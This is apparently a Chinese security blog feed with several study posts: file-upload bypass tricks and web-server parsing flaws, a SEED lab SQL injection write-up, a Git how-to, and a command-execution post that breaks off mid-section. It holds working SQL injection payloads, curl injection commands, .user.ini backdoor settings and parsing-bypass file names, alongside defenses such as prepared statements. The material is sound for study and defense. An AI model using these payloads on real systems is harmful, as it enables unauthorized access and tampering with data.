class="hljs-string">&quot;(空格)\t\n\r\0\x0B&quot;</span>)<br></code></pre></td></tr></table></figure><p>功能：去除字符串<code>$str</code>的首尾的空白字符.第二个参数保持默认时，去除的字符为上述字符.</p><h2 id="其他绕过方法">2.4 其他绕过方法</h2><h3 id="php短标签">2.4.1 php短标签</h3><p>我们最常见的 PHP 标签是<code>&lt;?php ?&gt;</code>，但是 PHP中还有两种短标签，即<code>&lt;? ?&gt;</code>和<code>&lt;?= ?&gt;</code>.当关键字"php"被过滤了之后，此时我们便不能使用<code>&lt;?php ?&gt;</code>了，但是我们可以用另外两种短标签进行绕过，并且在短标签中的代码不需要使用分号<code>;</code>.其中，<code>&lt;? ?&gt;</code>相当于对<code>&lt;?php ?&gt;</code>的替换，而<code>&lt;?=(表达式) ?&gt;</code>则是相当于<code>&lt;?php echo (表达式) ?&gt;</code>.支持版本：PHP5.4+</p><h3 id="php反引号">2.4.2 php反引号</h3><p>PHP中，反引号可以直接命令执行系统命令，但是如果想要输出执行结果还需要使用echo 等函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `ls /`;<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment"># 使用&lt;?= ?&gt;短标签（比较灵活）</span><br><span class="hljs-meta">&lt;?=</span> `ls /`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="上传-.user.ini">2.4.3 上传 .user.ini</h3><ul><li><p>php.ini 是 php 的一个全局配置文件，对整个 web服务起作用；而.user.ini 和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门.</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">auto</span>_prepend_file=&lt;filename&gt;<span class="hljs-comment">//包含在文件头</span><br><span class="hljs-built_in">auto</span>_append_file=&lt;filename&gt;<span class="hljs-comment">//包含在文件尾</span><br></code></pre></td></tr></table></figure></li><li><p>局限性：在.user.ini 中使用这条配置是在同目录下的其他.php文件中包含配置中所指定的文件，也就是说需要该目录下存在.php文件.通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php文件.</p></li></ul><h1 id="web容器及iis">3. Web容器及IIS</h1><h2 id="常见web容器">3.1 常见Web容器</h2><ul><li>服务器:一种管理资源并为用户提供服务的计算机。Web服务器，即www服务器或http服务器。提供Web信息浏览服务。它只需支HTTP协议、HTML文档格式及URL。向浏览器提供服务的程序。</li><li>中间件:提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。中间件处在操作系统和更高一级应用程序之间。Web中间件就是提供Web应用软件和系统软件连接的一个软件的总称。</li><li>容器:是中间件的一种，作为操作系统和应用程序之间的桥梁，给处于其中的应用程序组件(JSP，PHP，ASP）提供一个环境。使处于其中的应用程序组件直接跟容器中的环境变量接口交互，不必关注其它系统问题。</li><li>三者之间很多是包含关系，Web服务器&gt;Web中间件&gt;Web容器。</li><li>web容器是一种<strong>服务程序</strong>，在服务器一个端口就有一个提供相应服务的程序，而这个程序就是处理从客户端发出的请求，如JAVA中的Tomcat容器，ASP的IIS都是这样的容器。一个服务器可以有多个容器。我们在常见web容器漏洞这部分学习中需要使用的容器如下:IIS、Apache、Nginx、Tomcat、Jboss、WebLogic。</li></ul><h2 id="iis简介">3.2 IIS简介</h2><ul><li>IIS的全称是互联网信息服务（Internet lnformationServices），是由微软公司提供的基于运行MicrosoftWindows的互联网基本服务。IIS包括FTP/FTPS、NNTP、HTTPS/HTTP、SMTP等服务。</li><li>一般用ASP.Net开发软件，然后靠lIS对公网提供服务，软件的底层是.netFramework</li><li>文件解析：<ul><li>当服务器接收到一个Http请求的时候，IIS首先需要决定如何去处理这个请求（服务器处理一个.htm页面和一个.aspx页面肯定是不一样)。那IIS依据什么去处理呢?根据文件的后缀名</li><li>服务器获取所请求的页面（也可以是文件，比如1.jpg）的后缀名以后，接下来会在服务器端寻找可以处理这类后缀名的应用程序，如果IIS找不到可以处理此类文件的应用程序，那么IIS将直接把这个文件返还给客户端。</li></ul></li></ul><h2 id="iis文件解析漏洞">3.3 IIS文件解析漏洞</h2><ul><li>文件解析漏洞一般用于各种上传漏洞中，在文件上传的地方一般会限制用户可以上传文件的后缀名，比如php的网站如果可以上传php文件，那么就可以上传一个php木马，然后控制该服务器了，也就是我们所说的getshell了。</li><li>实际的漏洞环境中IIS一般是和asp搭配的，上传的地方如果限制了.asp的后缀名，那么首先想到的应该是使用其它lIS支持的文件后缀。其实lIS解析asp脚本除了<strong>.asp</strong>后缀，还有<strong>.cer</strong>和<strong>.asa</strong>。</li><li>如果网站将.asp、.cer、.asa这样的可以被服务端解析的后缀名全部过滤了的话，就只能通过其它的一些方法绕过了。就比如文件解析漏洞。</li><li><strong>IIS6.0</strong>在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。这—漏洞有两种完全不同的利用方式:<ul><li>特殊符号“/”，任意文件夹名.asp目录下的任何文件都会被IIS当作asp脚本执行</li><li>特殊符号“;”，任意文件名.asp;.jpg，后缀是.jpg，可以绕过限制，但是IIS6.0的特殊符号“;”会将该文件当作asp脚本执行</li></ul></li></ul><p><strong>修复方法：</strong>升级IIS版本，IIS5.1与7.5均无此漏洞。</p><p>IIS7.5解析漏洞：<code>文件/任意文件名.php</code>，从而解析脚本文件。</p><p>实例：<code>http://ip/upload/6720210701210811.png/.php</code></p><h1 id="apache文件解析漏洞">4. Apache文件解析漏洞</h1><p><strong>Apache和php三种结合方法:</strong></p><ul><li>CGl:通常翻译为共同网关接口，是HTTP服务器与机器上的其他程序进行通信的一个接口，让Web服务器必要时启动额外的程序处理动态内容。</li><li>FastCGl:CGl解释器的更快实现，可以提供良好的性能、伸缩性、Fail-Over特性等等。</li><li>Module:把php编译为apache的模块，也是用的最多的一种方法。(Apache解析漏洞)</li></ul><p><strong>Apache解析文件的方法:</strong></p><p>一个重要文件<code>/etc/mime.types</code>：这里记录了大量的文件后缀和mime类型,当客户端请求一个文件时,如果后缀在这个列表里,那么apache就返回对应的content-type给浏览器.如果不在列表,apache不会返回Content-type给浏览器,而直接返回文件内容,由浏览器自动处理。</p><p><strong>漏洞原理：</strong></p><p>Apache文件解析漏洞涉及到一个解析文件的特性:</p><ul><li>Apache默认一个文件可以有多个以点分隔的后缀,当右边的后缀无法识别(不在mime.types内),则继续向左识别。</li><li>当我们请求这样一个文件:shell.php.xxx.yyy<ul><li>yyy -&gt;无法识别,向左</li><li>xxx -&gt; 无法识别,向左</li><li>php -&gt;发现后缀是php，交给php处理这个文件</li></ul></li><li>最后一步虽然交给了php来处理这个文件，但是php也不认识.aaa的后缀，所以只会直接输出。</li><li>漏洞根源：由于运维人员在配置服务器时，为了使apache服务器能解析php，而自己添加一个handler，例如:<code>AddHandler application/x-httpd-php .php</code>。它的作用也是为了让apache把php文件交给php_module解析,但是注意到它的后缀不是用正则去匹配的。所以,在文件名的任何位置匹配到php后缀,它都会让php_module解析。</li></ul><p><strong>修复方法：</strong></p><ul><li>不要使用AddHandler,改用SetHandler,写好正则。</li><li>禁止.php.这样的文件执行。</li></ul><p>注：/var/www/html是Apache的默认Web根目录</p><h1 id="nginx文件解析漏洞">5. Nginx文件解析漏洞</h1><h2 id="nginx配置">5.1 Nginx配置</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">相关目录<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html<span class="hljs-comment">#默认web目录</span><br><span class="hljs-regexp">/etc/</span>nginx/<span class="hljs-comment">#配置文件目录</span><br><span class="hljs-regexp">/etc/</span>php5/fpm<span class="hljs-comment">#php配置文件目录</span><br><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log <span class="hljs-comment">#访问日志</span><br><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>error.log <span class="hljs-comment">#错误日志</span><br></code></pre></td></tr></table></figure><h2 id="漏洞">5.2 漏洞</h2><p><strong>原理：</strong></p><ul><li>对任意文件名，在后面添加<code>/任意文件名.php</code>的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg/x.php进行解析攻击。</li><li>对低版本的Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。</li><li>和Apache一样，Nginx也是通过mime.types识别文件。文件在<code>/etc/nginx/mime.types</code>。</li></ul><p><strong>修复方法：</strong></p><ul><li>将php.ini文件中的cgi.fix_pathinfo（默认为1）的值设为0。这样php在解析1.jpg/1.php这样的目录时，只要1.php不存在就会显示404。</li><li>将/etc/php5/fpm/pool.d/www.conf中security.limitextensions后面的值记为.php。</li></ul><h1 id="tomcat任意文件上传">6. Tomcat任意文件上传</h1><ul><li>Tomcat 远程代码执行漏洞，编号:CVE-2017-12615</li><li>Tomcat配置文件web.xml中，Servlet配置readonly=fasle时，会引发任意文件上传漏洞。</li><li><strong>readonly参数默认是true</strong>，即不允许delete和put操作，所以通过XMLHttpRequest对象的put或者delete方法访问就会报告http403错误。但很多时候为了支持REST服务，会设置该属性为false。将 readonly参数设置为 false 时，即可通过 PUT方式创建一个JSP文件，并可以执行任意代码。</li><li>影响版本：Tomcat 7.0.0-7.0.81</li><li>Tomcat默认端口：8080</li></ul><h1 id="上传漏洞防御">7. 上传漏洞防御</h1><h2 id="防御原则">7.1 防御原则</h2><p><strong>核心思想：</strong>确保上传的文件不会被服务器解析成可执行的脚本，进而引发偏离功能设计的意外后果。</p><ul><li>限制文件上传类型：</li><li>在文件类型检查时，通常采用白名单限制安全的文件类型，因为黑名单常常会出现遗漏或者大小写绕过等问题。</li><li>使用随机数改写文件名和文件路径，杜绝上传时的文件名攻击。</li><li>对于图片的处理,可以考虑对其进行二次渲染/压缩（使用压缩函数或者resize函数），在处理图片的同时破环图片中可能包含的代码。</li><li>文件上传的目录设置为不可执行。只要Web容器无法解析该目录下的文件，即使上传了脚本文件，服务器本身也不会受到影响。</li><li>限制上传文件大小：<ul><li>限制上传文件的大小，防止由于内存、磁盘耗尽造成的拒绝服务</li><li>可以配置web server允许的最大Post大小</li><li>可以在代码层面获取上文件的大小，根据文件类型的不同进行进一步的过滤</li></ul></li><li>其他：<ul><li>确保上传的文件放在安全的路径下，必要时可将上传的文件存放于webserver之外的远程服务器。</li><li>确保web_server版本为最新，防止由于web_server漏洞造成的文件意外解析。</li><li>部分文件上传攻击会配合本地其他漏洞进行，所以也要保证web服务器减少其他可利用漏洞。</li></ul></li></ul><p>参考教程：</p><ol type="1"><li><a href="https://zhuanlan.zhihu.com/p/138200793">PHP之一句话木马 -知乎 (zhihu.com)</a></li><li><ahref="https://www.freebuf.com/articles/network/279563.html">老生常谈的无字母数字Webshell 总结 - FreeBuf网络安全行业门户</a></li><li><ahref="https://www.cnblogs.com/-zhong/p/10969749.html">php的intval函数 -yourse1f - 博客园 (cnblogs.com)</a></li><li><ahref="https://blog.csdn.net/qq_35630119/article/details/122642068">文件上传利用的常见函数_文件上传函数_wingaso的博客-CSDN博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Git</title>
    <link href="/2023/11/09/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Git/"/>
    <url>/2023/11/09/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Git/</url>
    
    <content type="html"><![CDATA[<h1 id="上传本地项目">1. 上传本地项目</h1><ul><li><p>github新建仓库（分支为master，选择生成readme）</p></li><li><p>在本地找到需要上传到远程仓库的项目的根目录，然后点击鼠标右键打开GitBash Here</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">git init <span class="hljs-comment">#初始化</span><br>git remote <span class="hljs-keyword">add </span><span class="hljs-keyword">origin </span>仓库地址 <span class="hljs-comment">#与远程仓库进行关联</span><br>git pull <span class="hljs-keyword">origin </span>master <span class="hljs-comment">#将远程分支与本地分支进行关联</span><br>git <span class="hljs-keyword">add </span>. <span class="hljs-comment">#把所有修改的信息添加到暂存区</span><br>git commit -m <span class="hljs-string">&quot;message&quot;</span> <span class="hljs-comment">#将暂存区的修改提交到本地仓库</span><br>git push <span class="hljs-keyword">origin </span>master <span class="hljs-comment">#将本地仓库master分支的更新推送到远程仓库上</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="常见报错">2. 常见报错</h1><h2id="unable-to-access-xxxxx.git-recv-failure-connection-was-reset">2.1unable to access 'xxxxx.git' Recv failure Connection was reset</h2><ol type="1"><li><p>报错信息</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309302011809.png"alt="image-20230930200808727" /><figcaption aria-hidden="true">image-20230930200808727</figcaption></figure></li><li><p>解决方案</p><ul><li><p>报错原因：开启了代理，所以端口不对无法连接</p></li><li><p>解决：</p><ul><li><p>查看代理使用端口，如7890</p></li><li><p>配置git</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># xxxx为端口号</span><br>git config --global http.proxy http://127.0.0.1:xxxx<br></code></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL Injection Attack</title>
    <link href="/2023/11/07/SEED-LABS/Web%20Security/SQL%20Injection%20Attack/"/>
    <url>/2023/11/07/SEED-LABS/Web%20Security/SQL%20Injection%20Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="overview">1. Overview</h1><ul><li>SQL注入是一种代码注入技术，它利用web应用程序和数据库服务器之间接口中的漏洞。当用户的输入在发送到后端数据库服务器之前未在web应用程序中正确检查时，就会出现此漏洞。许多web应用程序从用户处获取输入，然后使用这些输入构造SQL查询，这样web应用程序就可以从数据库中获取信息。Web应用程序还使用SQL查询在数据库中存储信息。这些是web应用程序开发中的常见做法。如果未仔细构造SQL查询，则可能会出现SQL注入漏洞。SQL注入攻击是对web应用程序最常见的攻击之一。</li><li>在本实验室中，我们创建了一个易受SQL注入攻击的web应用程序。我们的web应用程序包含许多web开发人员所犯的常见错误。学生的目标是找到利用SQL注入漏洞的方法，演示攻击可能造成的损害，并掌握有助于抵御此类攻击的技术。</li></ul><h1 id="lab-environment">2. Lab Environment</h1><ol type="1"><li><p>/etc/hosts文件中添加IP域名映射.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810535.png"alt="image-20231107170405811" /><figcaption aria-hidden="true">image-20231107170405811</figcaption></figure></li><li><p>构建容器镜像，启动容器.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dcbuild<br>dcup<br></code></pre></td></tr></table></figure></li><li><p>进入网站：<code>www.seed-server.com</code>，显示正常，证明环境搭建成功.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810537.png"alt="image-20231107170500338" /><figcaption aria-hidden="true">image-20231107170500338</figcaption></figure></li></ol><h1 id="lab-tasks">3. Lab Tasks</h1><h2 id="task-1-get-familiar-with-sql-statements">3.1 Task 1: GetFamiliar with SQL Statements</h2><ol type="1"><li><code>dockps</code>查看正在运行的容器，找到mysql容器的ID；</li><li><code>docksh ID</code>进入容器的shell；</li><li><code>mysql -u root -pdees</code>登录进入mysql交互界面；</li><li><code>show databases;</code>查看数据库；</li><li><code>use sqllab_users;</code>选择进入已创建的数据库；</li><li><code>show tables;</code>查看表；</li><li><code>select * from credential where Name='Alice';</code>打印Alice的所有信息</li></ol><h2 id="task-2-sql-injection-attack-on-select-statement">3.2 Task 2: SQLInjection Attack on SELECT Statement</h2><h3 id="task-2.1-sql-injection-attack-from-webpage">3.2.1 Task 2.1: SQLInjection Attack from webpage</h3><ul><li>注入语句：username:<code>admin’—(空格)</code>或<code>admin’#</code>；password:任意值，可为空.</li><li>注入原理：字符型注入，通过单引号进行闭合.<code>—(空格)</code>和<code>#</code>在SQL查询语句中都表示注释，因此后面的SQL语句不会执行.根据伪代码，用户名为admin，查询得到全部用户信息.</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810538.png"alt="image-20231107171205106" /><figcaption aria-hidden="true">image-20231107171205106</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810539.png"alt="image-20231107171210069" /><figcaption aria-hidden="true">image-20231107171210069</figcaption></figure><h3 id="task-2.2-sql-injection-attack-from-command-line.">3.2.2 Task2.2: SQL Injection Attack from command line.</h3><ul><li>注入原理：同task2.1相同，只需要对特殊字符进行URL编码即可.%27是单引号的url编码，%20是空格的url编码，%23是#的url编码.</li><li>注入命令1（使用--进行注释）：<code>curl 'www.seed-server.com/unsafe_home.php?username=admin%27--%20&amp;Password='</code>;注入命令2（使用#进行注释）：<code>curl 'www.seed-server.com/unsafe_home.php?username=admin%27%23&amp;Password='</code>.</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810540.png"alt="image-20231107171906043" /><figcaption aria-hidden="true">image-20231107171906043</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810541.png"alt="image-20231107171913097" /><figcaption aria-hidden="true">image-20231107171913097</figcaption></figure><h3 id="task-2.3append-a-new-sql-statement">3.2.3 Task 2.3:Append a newSQL statement</h3><ul><li>注入语句：username：<code>admin';UPDATE credential  SET Salary = '66666' WHERE Name='Alice';#</code>；password：任意值。</li><li>执行效果：注入失败，返回报错信息。</li><li>原因分析：使用mysqli对象中的query()方法每次调用只能执行一条SQL命令。如果需要一次执行多条SQL命令，就必须使用mysqli对象中的multi_query()方法。具体做法是把多条SQL命令写在同一个字符串里作为参数传递给multi_query()方法，多条SQL之间使用分号（;）分隔。通过代码审计，发现后端使用了query()方法，因此执行多条SQL语句会报错。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810542.png"alt="image-20231107172136741" /><figcaption aria-hidden="true">image-20231107172136741</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810543.png"alt="image-20231107172141689" /><figcaption aria-hidden="true">image-20231107172141689</figcaption></figure><h2 id="task-3-sql-injection-attack-on-update-statement">3.3 Task 3: SQLInjection Attack on UPDATE Statement</h2><h3 id="task-3.1-modify-your-own-salary">3.3.1 Task 3.1: Modify your ownsalary</h3><ul><li>注入语句：<code>1’,Salary=’666666</code>.</li><li>注入原理：利用SQL语句对用户输入直接进行拼接的漏洞，添加了一个字段和对应值.成功修改个人工资.</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810544.png"alt="image-20231107172301359" /><figcaption aria-hidden="true">image-20231107172301359</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810545.png"alt="image-20231107172315590" /><figcaption aria-hidden="true">image-20231107172315590</figcaption></figure><h3 id="task-3.2modify-other-people-salary">3.3.2 Task 3.2:Modify otherpeople’ salary</h3><ul><li>注入语句：<code>',salary='1' where name='Boby'#</code>.</li><li>注入原理：SQL更新语句是根据where后面的值进行查找更新，可以将name值设置为Boby，即可修改Boby信息.查看所有人信息，成功修改Boby工资.</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810546.png"alt="image-20231107172506189" /><figcaption aria-hidden="true">image-20231107172506189</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810547.png"alt="image-20231107172511134" /><figcaption aria-hidden="true">image-20231107172511134</figcaption></figure><h3 id="task-3.3modify-other-people-password">3.3.3 Task 3.3:Modifyother people’ password</h3><ul><li>注入语句：<code>',password='修改密码SHA1值' where name='Boby'#</code>.</li><li>注意：因为数据库中存储了密码SHA1值，因为我们直接修改密码时需要先进行SHA1转换.成功以修改后的密码登录boby账号.</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810548.png"alt="image-20231107172621254" /><figcaption aria-hidden="true">image-20231107172621254</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810549.png"alt="image-20231107172605030" /><figcaption aria-hidden="true">image-20231107172605030</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810550.png"alt="image-20231107172610471" /><figcaption aria-hidden="true">image-20231107172610471</figcaption></figure><h2 id="task-4-countermeasure-prepared-statement">3.4 Task 4:Countermeasure — Prepared Statement</h2><ol type="1"><li><p>修改代码：使用预处理机制，实现代码与数据分离.代码流程：先创建一个SQL查询的准备语句，绑定参数，"ss"表示两个参数都是字符串类型，执行SQL查询，将查询结果的各个列的值绑定到相应的变量，最后从数据库中获取一行查询结果，将其存储在绑定的变量中.注：修改后需要重新构建容器镜像，启动容器.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810551.png"alt="image-20231107172709635" /><figcaption aria-hidden="true">image-20231107172709635</figcaption></figure></li><li><p>正常查询个人信息，正常显示.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810552.png"alt="image-20231107172724532" /><figcaption aria-hidden="true">image-20231107172724532</figcaption></figure></li><li><p>通过SQL注入方式访问admin个人信息，没有显示信息，证明预处理语句生效.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810553.png"alt="image-20231107172736731" /><figcaption aria-hidden="true">image-20231107172736731</figcaption></figure></li><li><p>预处理语句防范SQL注入原理：将用户输入的数据与SQL查询分开，通过参数绑定（同时指定了参数类型）和自动转义来防止SQL注入攻击，同时提供了更好的性能和可维护性.</p></li></ol><p>参考教程：</p><ol type="1"><li><ahref="https://seanxz401.github.io/2022/12/31/网络攻防-SQL注入/">网络攻防-SQL注入- Sean's Blog (seanxz401.github.io)</a></li><li><a href="https://gls.show/p/961c048e/">SEED-lab：SQL InjectionAttack Lab - 郭佳明的博客 (gls.show)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Web Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/2023/11/04/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2023/11/04/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行漏洞概述">1. 命令执行漏洞概述</h1><h2 id="定义">1.1 定义</h2><p>命令执行漏洞是指攻击者可以随意执行系统命令，分为远程命令执行(远程代码执行）和系统命令执行两类。</p><h2 id="原理">1.2 原理</h2><p>应用程序有时需要调用一些执行命令的函数，由于服务器对代码中可执行的特殊函数入口没有做过滤，并且用户能够控制这些函数中的参数时，就可以将恶意命令拼接到正常命令中，从而造成命令执行攻击。命令执行漏洞可以分为远程命令执行（代码执行）和系统命令执行两类，常见危险函数也分为两类：代码执行函数和命令执行函数。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PHP中常见代码执行函数：<br><span class="hljs-function"><span class="hljs-title">array_map</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">eval</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">assert</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">preg_replace</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">call_user_func</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>)动态函数<br><br>PHP中常见系统命令执行函数：<br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span><br>反引号<span class="hljs-string">&quot;·&quot;</span><br></code></pre></td></tr></table></figure><h2 id="条件">1.3 条件</h2><ul><li>用户能够控制的函数输入</li><li>存在可以执行代码或者系统命令的危险函数</li></ul><h2 id="管道符号">1.4 管道符号</h2><ul><li>Linux：<ul><li><p>；前面的执行完执行后面的，两者互不影响</p><ul><li>在终端中输入"whoami;ls"，查看";"管道符前后两个命令都正确的结果 <imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808753.png"alt="image.png" /></li><li>在终端中输入"whoam;ls"，查看";"管道符前面命令错误，后面命令正确的结果<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808755.png"alt="image.png" /></li><li>在终端中输入"whoami;lss"，查看";"管道符前面命令正确，后面命令错误的结果<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808756.png"alt="image.png" /></li></ul></li><li><p>|是管道符，显示后面的执行结果</p><ul><li>在终端中输入"whoami|ls"，查看"|"管道符前后两个命令都正确的结果 <imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808757.png"alt="image.png" /></li><li>在终端中输入"whoam|ls"，查看"|"管道符前面命令错误，后面命令正确的结果<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808758.png"alt="image.png" /></li><li>在终端中输入"whoami|lss"，查看"|"管道符前面命令正确，后面命令错误的结果<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808759.png"alt="image.png" /></li></ul></li><li><p>||当前面的执行出错时才执行后面的</p><ul><li>在终端中输入"whoami||ls"，查看"||"管道符前后两个命令都正确的结果<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808760.png"alt="image.png" /></li><li>在终端中输入"whoam||ls"，查看"||"管道符前面命令错误，后面命令正确的结果<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808761.png"alt="image.png" /></li><li>在终端中输入"whoami|lss"，查看"|"管道符前面命令正确，后面命令错误的结果<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808762.png"alt="image.png" /></li></ul></li></ul></li><li>Windows：<ul><li>&amp;前面的语句为假则直接执行后面的，类似于Lniux的<code>；</code></li><li>&amp;&amp;前面的语句为假则直接出错，后面的也不执行</li><li>|直接执行后面的语句.对比Lniux：如果前面出错，后面的命令也不会执行</li><li>||前面出错才执行后面的.同Lniux的<code>||</code></li></ul></li></ul><p>参考：<ahref="https://blog.csdn.net/qq_42024821/article/details/111477931">window和linux中管道符在命令执行中的用法_命令衔接符,能让注入的命令whoami得到执行的是-CSDN博客</a></p><h2 id="通用命令符">1.5 通用命令符</h2><ul><li><code>command1 &amp;&amp; command2</code>：command1执行成功才执行command2</li><li><code>command1 | command2</code>：只执行command2</li><li><code>command1 &amp; command2</code>：command1和command2之间互相不影响</li></ul><h2 id="常见场景">1.6 常见场景</h2><ul><li>Ping主机</li><li>DNS请求</li><li>Ofice文档</li><li>框架缺陷</li></ul><h2 id="危害">1.7 危害</h2><ul><li>继承Web服务程序的权限去执行系统命令(任意代码）或读写文件</li><li>反弹shell</li><li>控制整个网站甚至控制服务器</li><li>进一步内网渗透</li></ul><h1 id="远程命令执行">2. 远程命令执行</h1><h2 id="相关函数">2.1 相关函数</h2><p>在PHP下，允许命令执行的函数有: - <code>array_map()</code> -<code>eval()</code> - <code>assert()</code> -<code>preg_replace()</code> - <code>call user_func()</code> -<code>$a(Sb)</code></p><h3 id="array_map">2.1.1 array_map()</h3><p>功能：为数组的每个元素应用回调函数</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808763.png"alt="image-20231110162302023" /><figcaption aria-hidden="true">image-20231110162302023</figcaption></figure><h3 id="eval">2.1.2 eval()</h3><p>功能：将字符串当作PHP代码执行</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808764.png"alt="image-20231110145427894" /><figcaption aria-hidden="true">image-20231110145427894</figcaption></figure><h3 id="assert">2.1.3 